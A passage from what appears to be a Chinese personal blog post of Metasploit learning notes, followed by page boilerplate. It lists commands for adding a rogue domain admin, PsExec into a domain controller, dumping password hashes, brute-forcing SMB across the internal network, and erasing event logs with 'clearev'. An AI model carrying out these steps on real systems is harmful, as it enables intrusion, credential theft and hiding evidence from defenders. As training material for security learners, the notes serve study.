class="line">net user <span class="built_in">test</span> test123 /ad /domain <span class="comment"># 添加域管理员</span></span><br><span class="line">net group <span class="string">"domain admins"</span> /domain  <span class="comment">#查看域管理员是否添加成功</span></span><br></pre></td></tr></table></figure></p>
+<h4 id="登录域控"><a href="#登录域控" class="headerlink" title="登录域控"></a>登录域控</h4><p>下面要登录域控，抓取hash</p>
+<p>常见的登录域控的方法：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">- 利用IPC上传AT&amp;Achtasks远程执行命令</span><br><span class="line">- 利用端口转发或Socks登录DC的3389</span><br><span class="line">- 登录对方内网一台主机使用PsTools工具包中的PsExec来反弹shell</span><br><span class="line">- 使用msf下的PsExec，psexec_psh, Impacket psexec, pth-winexe, Empire Invoke-Psexec等PsExec类工具反弹shell</span><br><span class="line">- 使用msf下的smb_login反弹shell</span><br><span class="line">- 使用WMI来进行攻击</span><br><span class="line">- 使用PsRemoting posershel远程执行命令</span><br><span class="line">- 其他</span><br></pre></td></tr></table></figure></p>
+<p>最常见的是msf下的PsEcex反弹meterpreter(1.msf下的PsEcex模块   2.cuestom模块,建议使用Veil之类的工具来生成免杀的payload)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">use /exploit/windows/smb/psexec</span><br><span class="line"><span class="built_in">set</span> smbuser <span class="built_in">test</span></span><br><span class="line"><span class="built_in">set</span> smbpass test123</span><br><span class="line"><span class="built_in">set</span> smbdomain HACKER</span><br><span class="line"><span class="built_in">set</span> rhost 192.168.0.111</span><br><span class="line">run</span><br><span class="line"><span class="comment"># 获得反弹的meterpreter shell之后，先迁移进程，查看DC的系统系统和sesssion控制图</span></span><br><span class="line">ps</span><br><span class="line">migrate 2166</span><br><span class="line">getuid</span><br><span class="line">sysinfo</span><br><span class="line">sessions    <span class="comment"># 查看我们获取的sessions</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 抓hash方法：</span></span><br><span class="line">- msf自带的hashdump(有system权限才可以)或smart_dump模块导出用户的Hash</span><br><span class="line">- 使用PowerShell的相应模块导出<span class="built_in">hash</span></span><br><span class="line">- 使用WCE、Mimikatz等工具</span><br><span class="line">- 其他</span><br></pre></td></tr></table></figure></p>
+<h4 id="SMB爆破内网"><a href="#SMB爆破内网" class="headerlink" title="SMB爆破内网"></a>SMB爆破内网</h4><p>有了DC的密码，接下来只需快速在内网扩大控制权限</p>
+<ul>
+<li>利用当前获取的DC的账户密码，对整个域控的IP短进行扫描</li>
+<li>使用SMB下的smb_login模块</li>
+<li>端口转发或socks代理进内网</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 先在msf添加路由，然后使用smb_login模块Huo psexec_Scanner模块进行爆破</span></span><br><span class="line">background</span><br><span class="line">route add 192.168.0.115 255.255.255.0  2    <span class="comment"># 目的是访问1192.168.0.115将通过meterpreter的会话 2 来访问：</span></span><br><span class="line">search smb_login</span><br><span class="line">use auxiliary/scanner/smb/smb_login</span><br><span class="line"><span class="built_in">set</span> ...</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"><span class="comment"># 扫描内网</span></span><br><span class="line">creds  <span class="comment"># 然后获得大量内网服务器的密码，下面就可以畅游内网了</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 可以使用Meterpreter的端口转发，也可以使用Metasploit下的Socks4a模块或第三方软件(这里使用简单的第一种)</span></span><br><span class="line">portfwd add -l 5555 -p 3389 -r 127.0.0.1</span><br><span class="line">background</span><br></pre></td></tr></table></figure>
+<h4 id="清理日志"><a href="#清理日志" class="headerlink" title="清理日志"></a>清理日志</h4><p><strong>步骤</strong></p>
+<ul>
+<li>删除之前添加的域管理员的帐号</li>
+<li>删除所有在渗透中使用的工具</li>
+<li>删除应用程序、系统和安全日志</li>
+<li>关闭所有的Meterpreter连接</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net user <span class="built_in">test</span> /dels</span><br><span class="line">clearev    <span class="comment"># 删除日志</span></span><br><span class="line">sessions</span><br><span class="line">sessions -K <span class="comment"># 关闭所有msf连接</span></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>如果你觉得这篇文章还满意的话，请我喝杯咖啡喝吧^_^</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="浮生 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.jpg" alt="浮生 支付宝">
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    浮生
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://www.xpshuai.cn/Metasploit初学-散记/" title="Metasploit初学-散记">http://www.xpshuai.cn/Metasploit初学-散记/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Metasploit/" rel="tag"> <i class="fa fa-tag"></i> Metasploit</a>
+          
+        </div>
+      
+
+      
+      
+        <div class="post-widgets">
+        
+
+        
+
+        
+          
+          <div id="needsharebutton-postbottom">
+            <span class="btn">
+              <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </span>
+          </div>
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/ms-16075提权Windows-Server-2008/" rel="next" title="ms-16075提权Windows Server 2008">
+                <i class="fa fa-chevron-left"></i> ms-16075提权Windows Server 2008
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        
+  <div class="bdsharebuttonbox">
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+    <a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a>
+    <a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+    <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a class="bds_count" data-cmd="count"></a>
+  </div>
+  <script>
+    window._bd_share_config = {
+      "common": {
+        "bdText": "",
+        "bdMini": "2",
+        "bdMiniList": false,
+        "bdPic": ""
+      },
+      "share": {
+        "bdSize": "16",
+        "bdStyle": "0"
+      },
+      "image": {
+        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
+        "viewText": "分享到：",
+        "viewSize": "16"
+      }
+    }
+  </script>
+
+<script>
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/tx.jpg" alt="浮生">
+            
+              <p class="site-author-name" itemprop="name">浮生</p>
+              <p class="site-description motion-element" itemprop="description">侠之大者，为国为民</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">103</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">95</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/shuai06" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://blog.csdn.net/qq_37622608" target="_blank" title="CSDN">
+                      
+                        <i class="fa fa-fw fa-copyright"></i>CSDN</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          <div id="music163player">
+              <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="298" height="52" src="//music.163.com/outchain/player?type=2&id=247172&auto=0&height=32"></iframe>
+          </div>
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://muyuuuu.github.io/" title="兰铃" target="_blank">兰铃</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.aigisss.com/" title="aigisss" target="_blank">aigisss</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.blts.xyz/" title="帅气小学弟" target="_blank">帅气小学弟</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://zlh.giserhub.com" title="GIS大神阿昊哥" target="_blank">GIS大神阿昊哥</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.xbeichen.cn/" title="X北辰北" target="_blank">X北辰北</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.farmsec.cn/" title="农夫安全博客" target="_blank">农夫安全博客</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.xiaodi8.com/" title="小迪渗透吧" target="_blank">小迪渗透吧</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#MSF"><span class="nav-number">1.</span> <span class="nav-text">MSF</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#理论方面"><span class="nav-number">1.1.</span> <span class="nav-text"> 理论方面</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#技术架构"><span class="nav-number">1.1.0.1.</span> <span class="nav-text">技术架构</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#接口"><span class="nav-number">1.1.0.2.</span> <span class="nav-text">接口</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#为什么要使用Metasploit"><span class="nav-number">1.1.0.3.</span> <span class="nav-text">为什么要使用Metasploit</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用MSF"><span class="nav-number">1.2.</span> <span class="nav-text"> 使用MSF</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#准备使用"><span class="nav-number">1.2.0.1.</span> <span class="nav-text">准备使用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#情报搜集"><span class="nav-number">1.2.0.2.</span> <span class="nav-text">情报搜集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞利用"><span class="nav-number">1.2.0.3.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Bypass-UAC"><span class="nav-number">1.2.0.4.</span> <span class="nav-text">Bypass UAC</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Meterpreter（属于后渗透攻击）"><span class="nav-number">1.2.0.5.</span> <span class="nav-text">Meterpreter（属于后渗透攻击）</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#后渗透攻击：提权"><span class="nav-number">1.2.0.5.0.1.</span> <span class="nav-text">后渗透攻击：提权</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#后渗透攻击：移植漏洞利用代码模块"><span class="nav-number">1.2.0.5.0.2.</span> <span class="nav-text">后渗透攻击：移植漏洞利用代码模块</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#后渗透攻击：后门"><span class="nav-number">1.2.0.5.0.3.</span> <span class="nav-text">后渗透攻击：后门</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#msf基础命令"><span class="nav-number">1.2.0.6.</span> <span class="nav-text">msf基础命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Meterpreter命令："><span class="nav-number">1.2.0.7.</span> <span class="nav-text">Meterpreter命令：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#msfvenom基础"><span class="nav-number">1.2.0.8.</span> <span class="nav-text">msfvenom基础</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#反弹Shell"><span class="nav-number">1.2.0.9.</span> <span class="nav-text">反弹Shell</span></a></li></ol><li class="nav-item nav-level-2"><a class="nav-link" href="#一些小思路"><span class="nav-number">1.3.</span> <span class="nav-text">一些小思路</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#信息搜集"><span class="nav-number">1.3.0.1.</span> <span class="nav-text">信息搜集</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#获取另外一台服务器权限"><span class="nav-number">1.3.0.1.0.1.</span> <span class="nav-text">获取另外一台服务器权限</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Powershell寻找域管在线服务器"><span class="nav-number">1.3.0.2.</span> <span class="nav-text">Powershell寻找域管在线服务器</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#获取域管权限"><span class="nav-number">1.3.0.3.</span> <span class="nav-text">获取域管权限</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#登录域控"><span class="nav-number">1.3.0.4.</span> <span class="nav-text">登录域控</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SMB爆破内网"><span class="nav-number">1.3.0.5.</span> <span class="nav-text">SMB爆破内网</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#清理日志"><span class="nav-number">1.3.0.6.</span> <span class="nav-text">清理日志</span></a></li></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">  <i class="fa fa-heart"></i>   </span>
+  <span class="author" itemprop="copyrightHolder">浮生</span> |
+
+  <div class="powered-by">
+    由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+  </div>
+
+</div>
+
+
+
+<script language="javascript">
+  function siteTime(){
+    window.setTimeout("siteTime()", 1000);
+    var seconds = 1000;
+    var minutes = seconds * 60;
+    var hours = minutes * 60;
+    var days = hours * 24;
+    var years = days * 365;
+    var today = new Date();
+    var todayYear = today.getFullYear();
+    var todayMonth = today.getMonth()+1;
+    var todayDate = today.getDate();
+    var todayHour = today.getHours();
+    var todayMinute = today.getMinutes();
+    var todaySecond = today.getSeconds();
+    /* Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)
+    year - 作为date对象的年份，为4位年份值
+    month - 0-11之间的整数，做为date对象的月份
+    day - 1-31之间的整数，做为date对象的天数
+    hours - 0(午夜24点)-23之间的整数，做为date对象的小时数
+    minutes - 0-59之间的整数，做为date对象的分钟数
+    seconds - 0-59之间的整数，做为date对象的秒数
+    microseconds - 0-999之间的整数，做为date对象的毫秒数 */
+    var t1 = Date.UTC(2019,04,20,15,00,00); //北京时间2018-2-13 00:00:00
+    var t2 = Date.UTC(todayYear,todayMonth,todayDate,todayHour,todayMinute,todaySecond);
+    var diff = t2-t1;
+    var diffYears = Math.floor(diff/years);
+    var diffDays = Math.floor((diff/days)-diffYears*365);
+    var diffHours = Math.floor((diff-(diffYears*365+diffDays)*days)/hours);
+    var diffMinutes = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours)/minutes);
+    var diffSeconds = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours-diffMinutes*minutes)/seconds);
+    document.getElementById("sitetime").innerHTML=" 博客已健康运行"+ diffYears+" 年 "+ diffDays+" 天 "+diffHours+" 小时 "+diffMinutes+" 分钟 "+diffSeconds+" 秒";
+  }/*因为建站时间还没有一年，就将之注释掉了。需要的可以取消*/
+  siteTime();
+</script>
+
+<span id="sitetime"></span>
+
+<div class="BbeiAn-info">
+    冀ICP备 -
+    <a target="_blank" href="http://www.miitbeian.gov.cn/" style="color:#f0d784" rel="nofollow">18027796-1</a> <!--a标签中增加nofollow属性，避免爬虫出站。-->
+</div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src https: busuanzi.ibruce.info busuanzi 2.3 busuanzi.pure.mini.js""></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i> 访客数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      人
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i> 总访问量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+      <div id="needsharebutton-float">
+        <span class="btn">
+          <i class="fa fa-share-alt" aria-hidden="true"></i>
+        </span>
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item=>{
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: false,
+        appId: 'zlxLDm8dLo0s1Vz10PEvfuNh-gzGzoHsz',
+        appKey: 'UAKrQBSOGPavRUKC9ztdFBLK',
+        placeholder: '欢迎发表意见',
+        avatar:'mm',
+        guest_info:guest,
+        pageSize:'10' || 10,
+    });
+  </script>
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
